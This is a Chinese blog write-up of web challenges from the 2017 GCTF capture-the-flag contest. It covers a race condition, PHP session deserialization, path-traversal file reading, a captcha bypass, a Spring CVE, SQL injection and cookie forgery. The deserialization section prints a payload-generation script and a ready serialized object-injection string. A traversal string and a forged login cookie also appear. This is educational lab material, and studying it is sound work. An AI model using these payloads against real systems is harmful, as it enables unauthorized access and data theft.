---
title: 2017 GCTF Web WriteUp
tags: [write-up]
date: 2017-06-15 23:35
---
比赛的时候没来的及做听说很简单
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><p>比赛的时候没来的及做听说很简单</p>
<h1 id="0x01-条件竞争">0x01 条件竞争</h1>
<p>看了逻辑之后就是个简单的竞争题目 <br>
利用burp爆破即可 <br>
reset <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170615215132690?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
login <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170615215106815?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
最后得到flag <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170615215156925?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></br></br></img></br></br></br></p>
<h1 id="0x02-php序列化">0x02 PHP序列化</h1>
<p>这一题也是比较老套的题目，看具体的分析过程 <br>
在主页面 使用的session解析方式是 <br>
<code>ini_set('session.serialize_handler', 'php_serialize');</code> <br>
在<code>query.php</code>界面是php的默认解析方式 <br>
<a href="http://blog.csdn.net/qq_31481187/article/details/60968595">具体的区别参照我以前写的博客</a></br></br></br></br></p>
<h2 id="0x1-执行流程">0x1 执行流程</h2>
<p>在主页输入的src参数作为session的值存入服务器，当访问<code>query.php</code>时因为解析方法的不同使得session中的序列化的类被反序列化，因存在魔法函数导致了一系列的函数的执行，从而造成攻击</p>
<h2 id="0x2-代码分析">0x2 代码分析</h2>
<p>找到备份文件<code>query.php~</code></p>
<pre class="prettyprint"><code class=" hljs coffeescript"><span class="hljs-regexp">/************************/</span>
/*
<span class="hljs-regexp">//</span>query.php 閮ㄥ垎浠ｇ爜
session_start();
header(<span class="hljs-string">'Look me: edit by vim ~0~'</span>)
<span class="hljs-regexp">//</span>......
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TOPA</span>{</span>
    public $token;
    public $ticket;
    public $username;
    public $password;
    <span class="hljs-reserved">function</span> login(){
        <span class="hljs-regexp">//i</span>f($<span class="hljs-keyword">this</span>-&gt;username == $USERNAME &amp;&amp; $<span class="hljs-keyword">this</span>-&gt;password == $PASSWORD){ <span class="hljs-regexp">//</span>鎶辨瓑
        $<span class="hljs-keyword">this</span>-&gt;username ==<span class="hljs-string">'aaaaaaaaaaaaaaaaa'</span> &amp;&amp; $<span class="hljs-keyword">this</span>-&gt;password == <span class="hljs-string">'bbbbbbbbbbbbbbbbbb'</span>){
            <span class="hljs-keyword">return</span> <span class="hljs-string">'key is:{'</span>.$<span class="hljs-keyword">this</span>-&gt;token.<span class="hljs-string">'}'</span>;
        }
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TOPB</span>{</span>
    public $obj;
    public $attr;
    <span class="hljs-reserved">function</span> __construct(){
        $<span class="hljs-keyword">this</span>-&gt;attr = <span class="hljs-literal">null</span>;
        $<span class="hljs-keyword">this</span>-&gt;obj = <span class="hljs-literal">null</span>;
    }
    <span class="hljs-reserved">function</span> __toString(){
        $<span class="hljs-keyword">this</span>-&gt;obj = unserialize($<span class="hljs-keyword">this</span>-&gt;attr);
        $<span class="hljs-keyword">this</span>-&gt;obj-&gt;token = $FLAG;
        <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;obj-&gt;token === $<span class="hljs-keyword">this</span>-&gt;obj-&gt;ticket){
           <span class="hljs-keyword">return</span> (string)$<span class="hljs-keyword">this</span>-&gt;obj;
        }
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TOPC</span>{</span>
    public $obj;
    public $attr;
    <span class="hljs-reserved">function</span> __wakeup(){
        $<span class="hljs-keyword">this</span>-&gt;attr = <span class="hljs-literal">null</span>;
        $<span class="hljs-keyword">this</span>-&gt;obj = <span class="hljs-literal">null</span>;
    }
    <span class="hljs-reserved">function</span> __destruct(){
        echo $<span class="hljs-keyword">this</span>-&gt;attr;
    }
}
*/ </code></pre>
<p>大致的流程反序列化TOPC执行echo  TOPB 触发TOPB的tostring方法，TOPB自带反序列化TOPA的函数，反序列化A后return 触发TOPA中的tostring</p>
<h2 id="0x3-bypass">0x3 bypass</h2>
<p>TOPC的</p>
<pre class="prettyprint"><code class=" hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span>{</span>
        $<span class="hljs-keyword">this</span>-&gt;attr = <span class="hljs-literal">null</span>;
        $<span class="hljs-keyword">this</span>-&gt;obj = <span class="hljs-literal">null</span>;
    }</code></pre>
<p>需要绕过，方法利用序列化变量值不同</p>
<p>TOPB的</p>
<pre class="prettyprint"><code class=" hljs lasso"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$this</span><span class="hljs-subst">-&gt;</span>obj<span class="hljs-subst">-&gt;</span>token <span class="hljs-subst">===</span> <span class="hljs-variable">$this</span><span class="hljs-subst">-&gt;</span>obj<span class="hljs-subst">-&gt;</span>ticket)</code></pre>
<p>不是弱类型比较，利用引用的方法</p>
<h2 id="0x4-payload生成">0x4 payload生成</h2>
<pre class="prettyprint"><code class=" hljs lasso"><span class="hljs-variable">$a</span> <span class="hljs-subst">=</span> <span class="hljs-literal">new</span> TOPA();
<span class="hljs-variable">$a</span><span class="hljs-subst">-&gt;</span>token <span class="hljs-subst">=</span> <span class="hljs-subst">&amp;</span><span class="hljs-variable">$a</span><span class="hljs-subst">-&gt;</span>ticket;
<span class="hljs-variable">$a</span><span class="hljs-subst">-&gt;</span>username <span class="hljs-subst">=</span> <span class="hljs-string">'aaaaaaaaaaaaaaaaa'</span>;
<span class="hljs-variable">$a</span><span class="hljs-subst">-&gt;</span>password <span class="hljs-subst">=</span> <span class="hljs-string">'bbbbbbbbbbbbbbbbbb'</span>;
<span class="hljs-comment">//这里在代码逻辑上是不用给username&amp;password赋值的，估计是函数写错了 ，还有login函数是怎么触发的，如果是tostring函数逻辑上就将通了</span>
<span class="hljs-variable">$b</span> <span class="hljs-subst">=</span> <span class="hljs-literal">new</span> TOPB();
<span class="hljs-variable">$b</span><span class="hljs-subst">-&gt;</span>attr <span class="hljs-subst">=</span> serialize(<span class="hljs-variable">$a</span>);

<span class="hljs-variable">$c</span> <span class="hljs-subst">=</span> <span class="hljs-literal">new</span> TOPC();
<span class="hljs-variable">$c</span><span class="hljs-subst">-&gt;</span>attr <span class="hljs-subst">=</span> <span class="hljs-variable">$b</span>;


echo serialize(<span class="hljs-variable">$c</span>));</code></pre>
<h2 id="0x5-利用">0x5 利用</h2>
<p>在首页输入<code>src=|O:4:"TOPC":3:{s:3:"obj";N;s:4:"attr";O:4:"TOPB":2:{s:3:"obj";N;s:4:"attr";s:127:"O:4:"TOPA":4:{s:5:"token";N;s:6:"ticket";R:2;s:8:"username";s:17:"aaaaaaaaaaaaaaaaa";s:8:"password";s:18:"bbbbbbbbbbbbbbbbbb";}";}}</code> <br>
在query.php即可找到key <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616123037012?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616123049637?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></img></br></br></p>
<h1 id="0x03-读文件">0x03 读文件</h1>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616173242198?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>点击1.txt <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616191021313?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616191032938?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
猜测代码是include或者是file_get_content <br>
但不知道1.txt的目录在哪 <br>
尝试访问1.txt <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616191237050?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
估计在/a中的一个子目录下假设为/a/xxx/那么flag.php的位置应该是include的上级目录则是../flag.php因为./被替换成了空则上述字符串改写为…//fla./g.php <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616191639078?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></br></br></br></br></img></p>
<h1 id="0x04-验证码">0x04 验证码</h1>
<p>这又是一道关于验证码的题目。目前来说一些高级的验证码还是很安全的。这一题只是简单的验证码的实现，如果想知道原理可以参照我的另一篇博客</p>
<p>首先看这一题 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616192906819?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
验证码在验证的时候一般会有session会话 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616193056461?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
在验证的时候如果session检测这么写 <br>
<code>$_POST['authcode'] == $_SESSION['authcode']</code> <br>
注意这里运用了弱类型比较 <br>
那么就有绕过的机会 <br>
当两者都为空的时候就可以绕过 <br>
此题我猜想就是这样 <br>
利用burp直接爆破 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616193312156?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></br></br></br></br></br></img></br></br></img></br></p>
<h1 id="0x05-spring-css">0x05 spring-css</h1>
<p>直接网上查找cve <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170618232253841?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<p>直接使用</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170618232407407?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
发现flag位置 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170618232508077?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></p>
<h1 id="0x06-注入越权">0x06 注入越权</h1>
<p>这一题也是看过writeup写的，感觉一开始没有get到点，其实正过来向原理倒是挺简单的</p>
<p>看网页源码有提示，其实就是admin登录，利用update特性 <br>
首先它过滤了一些关键字符不能使用引号 <br>
看具体的注入代码</br></br></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170619000559020?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170619000621614?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h1 id="0x07-forbidden">0x07 Forbidden</h1>
<p>最开始想到的是XXF <br>
不过到最后层层递加</br></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170619001242066?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
解决什么问题自己百度吧 <br>
最后有个脑洞，话又说回来都是套路</br></br></img></p>
<pre class="prettyprint"><code class=" hljs cs"><span class="hljs-number">4e6</span>a59324d545a6a4e7a4d324e513d3d <span class="hljs-comment">//16进制</span>
NjY2MTZjNzM2NQ==<span class="hljs-comment">//base64</span>
<span class="hljs-number">66616</span>c7365<span class="hljs-comment">//16进制转字符</span>
<span class="hljs-keyword">false</span>

利用上述过程写出逆算法
得到<span class="hljs-number">4e7</span>a51334d6a63314e6a553d  </code></pre>
<p>放入cookie <br>
login=4e7a51334d6a63314e6a553d  <br>
最后传过去比对即可 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170619001948060?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></p></div>